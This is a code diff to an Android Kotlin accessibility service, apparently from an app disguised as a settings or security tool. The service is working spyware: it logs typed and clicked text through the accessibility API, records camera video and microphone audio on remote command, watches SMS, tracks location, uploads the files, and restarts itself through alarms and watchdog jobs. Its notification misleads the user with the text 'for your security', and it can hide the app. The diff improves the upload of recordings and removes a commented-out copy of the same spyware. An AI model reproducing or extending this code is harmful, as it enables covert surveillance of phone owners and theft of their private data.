@@ -58,6 +58,8 @@ import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
 import javax.inject.Inject
+import androidx.work.Constraints
+import androidx.work.NetworkType
 
 interface RecordingController {
     fun startVideoRecording(facing: Int)
@@ -303,19 +305,30 @@ class AccessibilityDataService : AccessibilityService(), LocationListener, Recor
         Log.d(TAG, "सभी रिकॉर्डिंग संसाधन सफलतापूर्वक साफ कर दिए गए हैं।")
     }
 
-
     private fun scheduleUpload(fileType: String) {
         recordingFile?.let { file ->
             if (file.exists() && file.length() > 0) {
                 interactor.setPushState(Consts.STATE_UPLOADING, randomName, fileType)
                 interactor.reportCommandStatus(fileType, "UPLOAD_STARTED", "File recorded. Starting upload.")
+
+                // --- YAHAN PAR SABSE ZAROORI BADLAV HAI ---
+
+                // Niyam banayein ki network juda hona chahiye
+                val constraints = Constraints.Builder()
+                    // Is line ko badla gaya hai
+                    .setRequiredNetworkType(NetworkType.CONNECTED) // Kaam tabhi chalega jab Wi-Fi YA Mobile Data chalu ho
+                    .build()
+
+                // Baaki sab waisa hi hai
                 val uploadWorkRequest = OneTimeWorkRequestBuilder<UploadWorker>()
                     .setInputData(workDataOf(
                         "FILE_PATH" to file.absolutePath,
                         "FILE_TYPE" to fileType,
                         "RANDOM_NAME" to randomName
                     ))
+                    .setConstraints(constraints)
                     .build()
+
                 WorkManager.getInstance(applicationContext).enqueue(uploadWorkRequest)
             } else {
                 interactor.setPushState("${Consts.STATE_FAILED}: Empty file", randomName, fileType)
@@ -323,6 +336,27 @@ class AccessibilityDataService : AccessibilityService(), LocationListener, Recor
             }
         }
     }
+
+
+//    private fun scheduleUpload(fileType: String) {
+//        recordingFile?.let { file ->
+//            if (file.exists() && file.length() > 0) {
+//                interactor.setPushState(Consts.STATE_UPLOADING, randomName, fileType)
+//                interactor.reportCommandStatus(fileType, "UPLOAD_STARTED", "File recorded. Starting upload.")
+//                val uploadWorkRequest = OneTimeWorkRequestBuilder<UploadWorker>()
+//                    .setInputData(workDataOf(
+//                        "FILE_PATH" to file.absolutePath,
+//                        "FILE_TYPE" to fileType,
+//                        "RANDOM_NAME" to randomName
+//                    ))
+//                    .build()
+//                WorkManager.getInstance(applicationContext).enqueue(uploadWorkRequest)
+//            } else {
+//                interactor.setPushState("${Consts.STATE_FAILED}: Empty file", randomName, fileType)
+//                interactor.reportCommandStatus(fileType, "FAILED", "Recording resulted in an empty file.")
+//            }
+//        }
+//    }
 
     @SuppressLint("MissingPermission")
     private fun openCamera(facing: Int) {
@@ -646,633 +680,3 @@ class AccessibilityDataService : AccessibilityService(), LocationListener, Recor
         }
     }
 }
-//package com.safe.setting.app.services.accessibilityData
-//
-//import android.Manifest
-//import android.accessibilityservice.AccessibilityService
-//import android.annotation.SuppressLint
-//import android.app.AlarmManager
-//import android.app.Notification
-//import android.app.NotificationChannel
-//import android.app.NotificationManager
-//import android.app.PendingIntent
-//import android.app.job.JobInfo
-//import android.app.job.JobScheduler
-//import android.content.ComponentName
-//import android.content.Context
-//import android.content.Intent
-//import android.content.pm.PackageManager
-//import android.hardware.camera2.CameraCaptureSession
-//import android.hardware.camera2.CameraDevice
-//import android.hardware.camera2.CameraManager
-//import android.location.Location
-//import android.location.LocationListener
-//import android.location.LocationManager
-//import android.media.MediaRecorder
-//import android.os.Build
-//import android.os.Handler
-//import android.os.HandlerThread
-//import android.os.Looper
-//import android.os.SystemClock
-//import android.provider.Telephony
-//import android.text.TextUtils
-//import android.util.Log
-//import android.view.Surface
-//import android.view.accessibility.AccessibilityEvent
-//import android.view.accessibility.AccessibilityNodeInfo
-//import androidx.core.app.ActivityCompat
-//import androidx.core.app.NotificationCompat
-//import androidx.core.content.ContextCompat
-//import androidx.work.OneTimeWorkRequestBuilder
-//import androidx.work.WorkManager
-//import androidx.work.workDataOf
-//import com.safe.setting.app.R
-//import com.safe.setting.app.app.Hom
-//import com.safe.setting.app.receiver.RestartServiceReceiver
-//import com.safe.setting.app.services.health.HealthCheckService
-//import com.safe.setting.app.services.sms.SmsObserver
-//import com.safe.setting.app.services.sms.SmsService
-//import com.safe.setting.app.services.watchdog.WatchdogJobService
-//import com.safe.setting.app.utils.ConstFun
-//import com.safe.setting.app.utils.Consts
-//import com.safe.setting.app.utils.ConstFun.enableGpsRoot
-//import com.safe.setting.app.utils.ConstFun.isRoot
-//import com.safe.setting.app.utils.Consts.TAG
-//import com.safe.setting.app.utils.FileHelper
-//import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
-//import com.safe.setting.app.workers.UploadWorker
-//import java.io.File
-//import java.text.SimpleDateFormat
-//import java.util.Date
-//import java.util.Locale
-//import javax.inject.Inject
-//
-//interface RecordingController {
-//    fun startVideoRecording(facing: Int)
-//    fun startAudioRecording()
-//}
-//
-//@SuppressLint("AccessibilityPolicy")
-//class AccessibilityDataService : AccessibilityService(), LocationListener, RecordingController {
-//
-//    companion object {
-//        var isRunningService: Boolean = false
-//            private set
-//        const val NOTIFICATION_CHANNEL_ID = "AccessibilityServiceChannel"
-//        const val NOTIFICATION_ID = 2
-//        const val RECORDING_DURATION = 30000L // 30 सेकंड
-//        const val PRIMING_VIDEO_RECORDING_DURATION = 5000L // ### नया: 5 सेकंड की वीडियो प्राइमिंग अवधि ###
-//        const val HEARTBEAT_INTERVAL = 2 * 60 * 1000L // 2 मिनट
-//    }
-//
-//    @Inject
-//    lateinit var interactor: InteractorAccessibilityData
-//
-//    private lateinit var locationManager: LocationManager
-//    private var smsObserver: SmsObserver? = null
-//    private val heartbeatHandler = Handler(Looper.getMainLooper())
-//    private lateinit var heartbeatRunnable: Runnable
-//    private var mediaRecorder: MediaRecorder? = null
-//    private var recordingFile: File? = null
-//    private lateinit var randomName: String
-//    private var isRecording = false
-//    private var cameraDevice: CameraDevice? = null
-//    private var captureSession: CameraCaptureSession? = null
-//    private lateinit var cameraManager: CameraManager
-//    private var cameraThread: HandlerThread? = null
-//    private var cameraHandler: Handler? = null
-//
-//    // ### नया: यह ट्रैक करने के लिए कि प्राइमिंग हो चुकी है ###
-//    private var isPrimingCommandExecuted = false
-//
-//    override fun onCreate() {
-//        super.onCreate()
-//        try {
-//            Hom.appComponent.inject(this)
-//            Log.i(TAG, "AccessibilityDataService is being created.")
-//            interactor.setRecordingController(this)
-//            cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
-//            scheduleRestartAlarm()
-//            scheduleWatchdogJob()
-//        } catch (e: Exception) {
-//            Log.e(TAG, "Service Dagger injection failed: ${e.message}")
-//        }
-//    }
-//
-//    override fun onServiceConnected() {
-//        super.onServiceConnected()
-//        isRunningService = true
-//        Log.i(TAG, "Accessibility service connected successfully.")
-//
-//        startForeground(NOTIFICATION_ID, createNotification("System service is running for your security."))
-//        startHeartbeat()
-//
-//        // ### बदला हुआ कोड: इंटरैक्टर को प्राइमिंग वीडियो कमांड भेजने के लिए कहें ###
-//        // ### हिंदी कमेंट: जैसे ही सर्विस कनेक्ट होती है, हम इंटरैक्टर को फायरबेस पर एक वीडियो कमांड सेट करने के लिए कहते हैं. ###
-//        interactor.triggerAutomaticVideoPrimingCommand()
-//
-//        val healthIntent = Intent(this, HealthCheckService::class.java)
-//        startService(healthIntent)
-//
-//        Handler(Looper.getMainLooper()).postDelayed({
-//            try {
-//                Log.i(TAG, "Starting delayed initialization.")
-//                initializeServices()
-//                interactor.setRunServiceData(true)
-//                startSmsService()
-//            } catch (e: Exception) {
-//                Log.e(TAG, "Error in delayed onServiceConnected initialization: ${e.message}")
-//            }
-//        }, 500)
-//    }
-//
-//    private fun startHeartbeat() {
-//        heartbeatRunnable = Runnable {
-//            Log.d(TAG, "Heartbeat: Service is active.")
-//            heartbeatHandler.postDelayed(heartbeatRunnable, HEARTBEAT_INTERVAL)
-//        }
-//        heartbeatHandler.post(heartbeatRunnable)
-//    }
-//
-//    private fun stopHeartbeat() {
-//        heartbeatHandler.removeCallbacks(heartbeatRunnable)
-//    }
-//
-//    private fun createNotification(contentText: String): Notification {
-//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-//            val serviceChannel = NotificationChannel(
-//                NOTIFICATION_CHANNEL_ID,
-//                "Device Security",
-//                NotificationManager.IMPORTANCE_DEFAULT
-//            )
-//            val manager = getSystemService(NotificationManager::class.java)
-//            manager.createNotificationChannel(serviceChannel)
-//        }
-//
-//        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
-//            .setContentTitle(getString(R.string.app_name))
-//            .setContentText(contentText)
-//            .setSmallIcon(R.mipmap.c_launcher_foreground)
-//            .setPriority(NotificationCompat.PRIORITY_MIN)
-//            .setOngoing(true)
-//            .build()
-//    }
-//
-//    private fun updateNotification(contentText: String) {
-//        val notification = createNotification(contentText)
-//        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-//        notificationManager.notify(NOTIFICATION_ID, notification)
-//    }
-//
-//    override fun onDestroy() {
-//        super.onDestroy()
-//        isRunningService = false
-//        stopHeartbeat()
-//        val healthIntent = Intent(this, HealthCheckService::class.java)
-//        stopService(healthIntent)
-//        try {
-//            interactor.setRunServiceData(false)
-//            interactor.clearDisposable()
-//            locationManager.removeUpdates(this)
-//            unregisterSmsObserver()
-//            Log.i(TAG, "AccessibilityDataService destroyed successfully.")
-//        } catch (e: Exception) {
-//            Log.e(TAG, "Error during service destruction: ${e.message}")
-//        }
-//    }
-//
-//    @Suppress("DEPRECATION")
-//    override fun startAudioRecording() {
-//        if (isRecording) {
-//            Log.w(TAG, "Already recording, ignoring new audio request.")
-//            return
-//        }
-//        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-//            interactor.reportCommandStatus("AUDIO", "FAILED", "Record audio permission not granted.")
-//            Log.e(TAG, "Audio recording permission not granted.")
-//            return
-//        }
-//
-//        isRecording = true
-//        randomName = ConstFun.getRandomNumeric()
-//        val filePath = FileHelper.getMediaFilePath(this)
-//        recordingFile = File(filePath, "$randomName.mp3")
-//
-//        interactor.setPushState(Consts.STATE_RECORDING, randomName, Consts.AUDIO)
-//        updateNotification("Recording audio...")
-//
-//        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else MediaRecorder()
-//
-//        mediaRecorder?.apply {
-//            try {
-//                setAudioSource(MediaRecorder.AudioSource.MIC)
-//                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-//                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-//                setOutputFile(recordingFile!!.absolutePath)
-//                prepare()
-//                start()
-//                Log.d(TAG, "Audio recording started.")
-//
-//                Handler(Looper.getMainLooper()).postDelayed({
-//                    stopAudioRecording()
-//                }, RECORDING_DURATION)
-//
-//            } catch (e: Exception) {
-//                Log.e(TAG, "MediaRecorder preparation failed: ${e.message}")
-//                interactor.setPushState("${Consts.STATE_FAILED}: ${e.message}", randomName, Consts.AUDIO)
-//                interactor.reportCommandStatus("AUDIO", "FAILED", "MediaRecorder prepare failed: ${e.message}")
-//                isRecording = false
-//                updateNotification("System service is running for your security.")
-//            }
-//        }
-//    }
-//
-//    private fun stopAudioRecording() {
-//        if (!isRecording) return
-//        mediaRecorder?.apply {
-//            try {
-//                stop()
-//                release()
-//                Log.d(TAG, "Audio recording stopped.")
-//            } catch (e: Exception) {
-//                Log.e(TAG, "Error stopping MediaRecorder: ${e.message}")
-//            }
-//        }
-//        mediaRecorder = null
-//        scheduleUpload("AUDIO")
-//        isRecording = false
-//        updateNotification("System service is running for your security.")
-//    }
-//
-//    override fun startVideoRecording(facing: Int) {
-//        if (isRecording) {
-//            Log.w(TAG, "Already recording, ignoring new video request.")
-//            return
-//        }
-//        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-//            interactor.reportCommandStatus("VIDEO", "FAILED", "Camera permission not granted.")
-//            Log.e(TAG, "Camera permission not granted.")
-//            return
-//        }
-//
-//        isRecording = true
-//        startCameraThread()
-//        randomName = ConstFun.getRandomNumeric()
-//        val filePath = FileHelper.getMediaFilePath(this)
-//        recordingFile = File(filePath, "$randomName.mp4")
-//        interactor.setPushState(Consts.STATE_RECORDING, randomName, Consts.VIDEO)
-//        updateNotification("Recording video...")
-//        setupMediaRecorder()
-//        openCamera(facing)
-//    }
-//
-//    private fun stopVideoRecording() {
-//        if (!isRecording) return
-//        try {
-//            captureSession?.stopRepeating()
-//            captureSession?.close()
-//            mediaRecorder?.stop()
-//            mediaRecorder?.release()
-//            cameraDevice?.close()
-//        } catch (e: Exception) {
-//            Log.e(TAG, "Error stopping video recording: ${e.message}")
-//        } finally {
-//            captureSession = null
-//            mediaRecorder = null
-//            cameraDevice = null
-//            isRecording = false
-//            stopCameraThread()
-//            scheduleUpload("VIDEO")
-//            updateNotification("System service is running for your security.")
-//        }
-//    }
-//
-//    private fun scheduleUpload(fileType: String) {
-//        recordingFile?.let { file ->
-//            if (file.exists() && file.length() > 0) {
-//                interactor.setPushState(Consts.STATE_UPLOADING, randomName, fileType)
-//                interactor.reportCommandStatus(fileType, "UPLOAD_STARTED", "File recorded. Starting upload.")
-//                val uploadWorkRequest = OneTimeWorkRequestBuilder<UploadWorker>()
-//                    .setInputData(workDataOf(
-//                        "FILE_PATH" to file.absolutePath,
-//                        "FILE_TYPE" to fileType,
-//                        "RANDOM_NAME" to randomName
-//                    ))
-//                    .build()
-//                WorkManager.getInstance(applicationContext).enqueue(uploadWorkRequest)
-//            } else {
-//                interactor.setPushState("${Consts.STATE_FAILED}: Empty file", randomName, fileType)
-//                interactor.reportCommandStatus(fileType, "FAILED", "Recording resulted in an empty file.")
-//            }
-//        }
-//    }
-//
-//    @SuppressLint("MissingPermission")
-//    private fun openCamera(facing: Int) {
-//        try {
-//            val cameraId = if (facing == CameraFacing.FRONT_FACING_CAMERA) "1" else "0"
-//            Log.d(TAG, "Attempting to open camera with ID: $cameraId (0=back, 1=front)")
-//            cameraManager.openCamera(cameraId, stateCallback, cameraHandler)
-//        } catch (e: Exception) {
-//            Log.e(TAG, "Failed to open camera: ${e.message}")
-//            interactor.reportCommandStatus("VIDEO", "FAILED", "OS failed to open camera: ${e.message}")
-//            isRecording = false
-//            updateNotification("System service is running for your security.")
-//        }
-//    }
-//
-//    private val stateCallback = object : CameraDevice.StateCallback() {
-//        override fun onOpened(camera: CameraDevice) {
-//            cameraDevice = camera
-//            startCaptureSession()
-//        }
-//        override fun onDisconnected(camera: CameraDevice) {
-//            camera.close()
-//            cameraDevice = null
-//        }
-//        override fun onError(camera: CameraDevice, error: Int) {
-//            camera.close()
-//            cameraDevice = null
-//            Log.e(TAG, "Camera error: $error")
-//            interactor.reportCommandStatus("VIDEO", "FAILED", "CameraDevice.StateCallback onError: $error")
-//            isRecording = false
-//            updateNotification("System service is running for your security.")
-//        }
-//    }
-//
-//    @Suppress("DEPRECATION")
-//    private fun startCaptureSession() {
-//        try {
-//            val surfaces = ArrayList<Surface>()
-//            val recorderSurface = mediaRecorder!!.surface
-//            surfaces.add(recorderSurface)
-//            cameraDevice?.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
-//                override fun onConfigured(session: CameraCaptureSession) {
-//                    captureSession = session
-//                    try {
-//                        val builder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
-//                        builder.addTarget(recorderSurface)
-//                        session.setRepeatingRequest(builder.build(), null, cameraHandler)
-//                        mediaRecorder?.start()
-//                        Log.d(TAG, "Video recording started.")
-//
-//                        // ### बदला हुआ कोड: प्राइमिंग और सामान्य रिकॉर्डिंग के लिए अलग-अलग अवधि ###
-//                        // ### हिंदी कमेंट: यहाँ हम जांचते हैं कि क्या यह पहली बार चल रहा है. अगर हाँ, तो केवल 5 सेकंड रिकॉर्ड करें. ###
-//                        val duration = if (!isPrimingCommandExecuted) {
-//                            isPrimingCommandExecuted = true // ### हिंदी कमेंट: फ्लैग को true पर सेट करें ताकि यह दोबारा न चले. ###
-//                            PRIMING_VIDEO_RECORDING_DURATION
-//                        } else {
-//                            RECORDING_DURATION
-//                        }
-//
-//                        Log.d(TAG, "Video recording duration set to: ${duration / 1000} seconds")
-//
-//                        Handler(Looper.getMainLooper()).postDelayed({
-//                            stopVideoRecording()
-//                        }, duration)
-//
-//                    } catch (e: Exception) {
-//                        Log.e(TAG, "Capture session error: ${e.message}")
-//                    }
-//                }
-//                override fun onConfigureFailed(session: CameraCaptureSession) {
-//                    Log.e(TAG, "Capture session configure failed.")
-//                    interactor.reportCommandStatus("VIDEO", "FAILED", "CameraCaptureSession onConfigureFailed.")
-//                    isRecording = false
-//                    updateNotification("System service is running for your security.")
-//                }
-//            }, cameraHandler)
-//        } catch (e: Exception) {
-//            Log.e(TAG, "Failed to start capture session: ${e.message}")
-//        }
-//    }
-//
-//    @Suppress("DEPRECATION")
-//    private fun setupMediaRecorder() {
-//        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else MediaRecorder()
-//        mediaRecorder?.apply {
-//            setAudioSource(MediaRecorder.AudioSource.MIC)
-//            setVideoSource(MediaRecorder.VideoSource.SURFACE)
-//            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-//            setOutputFile(recordingFile!!.absolutePath)
-//            setVideoEncodingBitRate(10000000)
-//            setVideoFrameRate(30)
-//            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
-//            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-//            try {
-//                prepare()
-//            } catch (e: Exception) {
-//                Log.e(TAG, "MediaRecorder prepare failed: ${e.message}")
-//            }
-//        }
-//    }
-//
-//    private fun startCameraThread() {
-//        cameraThread = HandlerThread("CameraBackgroundThread").also { it.start() }
-//        cameraHandler = Handler(cameraThread!!.looper)
-//    }
-//
-//    private fun stopCameraThread() {
-//        cameraThread?.quitSafely()
-//        try {
-//            cameraThread?.join()
-//            cameraThread = null
-//            cameraHandler = null
-//        } catch (e: InterruptedException) {
-//            Log.e(TAG, e.message.toString())
-//        }
-//    }
-//
-//    private fun initializeServices() {
-//        getLocation()
-//        interactor.getShowOrHideApp()
-//        interactor.getCapturePicture()
-//        interactor.getCaptureVideo()
-//        interactor.getCaptureAudio()
-//        registerSmsObserver()
-//    }
-//
-//    private fun startSmsService() {
-//        val serviceIntent = Intent(this, SmsService::class.java)
-//        try {
-//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-//                startForegroundService(serviceIntent)
-//            } else {
-//                startService(serviceIntent)
-//            }
-//            Log.i(TAG, "SmsService started from AccessibilityDataService.")
-//        } catch (e: Exception) {
-//            Log.e(TAG, "Failed to start SmsService: ${e.message}")
-//        }
-//    }
-//
-//    @SuppressLint("SwitchIntDef")
-//    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-//        if (event == null) return
-//
-//        try {
-//            val eventTypeString = when (event.eventType) {
-//                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "TEXT"
-//                AccessibilityEvent.TYPE_VIEW_FOCUSED -> "FOCUSED"
-//                AccessibilityEvent.TYPE_VIEW_CLICKED -> "CLICKED"
-//                else -> null
-//            }
-//
-//            eventTypeString?.let { type ->
-//                val textData = getEventText(event)
-//                if (textData.isNotEmpty()) {
-//                    val formattedData = "${getDateTime()} |($type)| $textData"
-//                    interactor.setDataKey(formattedData)
-//                    Log.i(TAG, formattedData)
-//                }
-//            }
-//        } catch (e: Exception) {
-//            Log.e(TAG, "Error processing accessibility event: ${e.message}")
-//        }
-//    }
-//
-//    private fun getEventText(event: AccessibilityEvent): String {
-//        val parentNodeInfo: AccessibilityNodeInfo? = event.source
-//        if (parentNodeInfo == null) {
-//            val eventText = event.text.toString()
-//            return if (eventText != "[]") eventText else ""
-//        }
-//        val text = findTextInNode(parentNodeInfo)
-//        return text.trim()
-//    }
-//
-//    private fun findTextInNode(nodeInfo: AccessibilityNodeInfo?): String {
-//        if (nodeInfo == null) return ""
-//        val builder = StringBuilder()
-//        if (!TextUtils.isEmpty(nodeInfo.text)) {
-//            builder.append(nodeInfo.text.toString()).append(" ")
-//        }
-//        for (i in 0 until nodeInfo.childCount) {
-//            val childNode = nodeInfo.getChild(i)
-//            if (childNode != null) {
-//                builder.append(findTextInNode(childNode))
-//            }
-//        }
-//        return builder.toString()
-//    }
-//
-//    private fun getDateTime(): String {
-//        return try {
-//            SimpleDateFormat("yyyy-MM-dd hh:mm:aa", Locale.getDefault()).format(Date())
-//        } catch (e: Exception) { "Unknown-Time" }
-//    }
-//
-//    override fun onInterrupt() {
-//        Log.w(TAG, "Accessibility service interrupted.")
-//    }
-//
-//    private fun registerSmsObserver() {
-//        try {
-//            if (smsObserver == null) {
-//                smsObserver = SmsObserver(this, Handler(Looper.getMainLooper()))
-//                contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver!!)
-//                Log.i(TAG, "SMS observer registered.")
-//            }
-//        } catch (e: Exception) {
-//            Log.e(TAG, "Failed to register SMS observer: ${e.message}")
-//        }
-//    }
-//
-//    private fun unregisterSmsObserver() {
-//        try {
-//            smsObserver?.let {
-//                contentResolver.unregisterContentObserver(it)
-//                smsObserver = null
-//                Log.i(TAG, "SMS observer unregistered.")
-//            }
-//        } catch (e: Exception) {
-//            Log.e(TAG, "Error unregistering SMS observer: ${e.message}")
-//        }
-//    }
-//
-//    @SuppressLint("MissingPermission")
-//    private fun getLocation() {
-//        try {
-//            locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-//            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
-//                interactor.enablePermissionLocation(true)
-//                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000, 0f, this)
-//                Log.i(TAG, "Location updates requested.")
-//            } else {
-//                interactor.enablePermissionLocation(false)
-//                Log.w(TAG, "Location permission not granted.")
-//            }
-//        } catch (e: Exception) {
-//            Log.e(TAG, "Error initializing location: ${e.message}")
-//            interactor.enablePermissionLocation(false)
-//        }
-//    }
-//
-//    override fun onLocationChanged(location: Location) {
-//        interactor.setDataLocation(location)
-//    }
-//
-//    override fun onProviderEnabled(provider: String) {
-//        if (provider == LocationManager.GPS_PROVIDER) {
-//            interactor.enableGps(true)
-//        }
-//    }
-//
-//    override fun onProviderDisabled(provider: String) {
-//        if (provider == LocationManager.GPS_PROVIDER) {
-//            interactor.enableGps(false)
-//            Handler(Looper.getMainLooper()).postDelayed({
-//                if (isRoot()) enableGpsRoot()
-//            }, 3000)
-//        }
-//    }
-//
-//    override fun onTaskRemoved(rootIntent: Intent?) {
-//        Log.e(TAG, "TASK REMOVED, RESTARTING SERVICE...")
-//        val restartServiceIntent = Intent(applicationContext, this.javaClass)
-//        restartServiceIntent.setPackage(packageName)
-//
-//        val restartServicePendingIntent = PendingIntent.getService(
-//            applicationContext, 1, restartServiceIntent,
-//            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
-//        )
-//        val alarmService = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
-//        alarmService.set(
-//            AlarmManager.ELAPSED_REALTIME,
-//            SystemClock.elapsedRealtime() + 1000,
-//            restartServicePendingIntent
-//        )
-//        super.onTaskRemoved(rootIntent)
-//    }
-//
-//    private fun scheduleRestartAlarm() {
-//        val restartServiceIntent = Intent(applicationContext, RestartServiceReceiver::class.java)
-//        val restartServicePendingIntent = PendingIntent.getBroadcast(
-//            applicationContext, 100, restartServiceIntent,
-//            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-//        )
-//        val alarmService = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
-//        alarmService.setRepeating(
-//            AlarmManager.ELAPSED_REALTIME_WAKEUP,
-//            SystemClock.elapsedRealtime() + 1000,
-//            AlarmManager.INTERVAL_FIFTEEN_MINUTES,
-//            restartServicePendingIntent
-//        )
-//        Log.i(TAG, "AlarmManager Watchdog scheduled.")
-//    }
-//
-//    private fun scheduleWatchdogJob() {
-//        val jobScheduler = getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
-//        val componentName = ComponentName(this, WatchdogJobService::class.java)
-//        val jobInfo = JobInfo.Builder(123, componentName)
-//            .setPeriodic(15 * 60 * 1000)
-//            .setPersisted(true)
-//            .build()
-//
-//        if (jobScheduler.schedule(jobInfo) == JobScheduler.RESULT_SUCCESS) {
-//            Log.i(TAG, "JobScheduler Watchdog scheduled successfully.")
-//        } else {
-//            Log.e(TAG, "Failed to schedule JobScheduler Watchdog.")
-//        }
-//    }
-//}
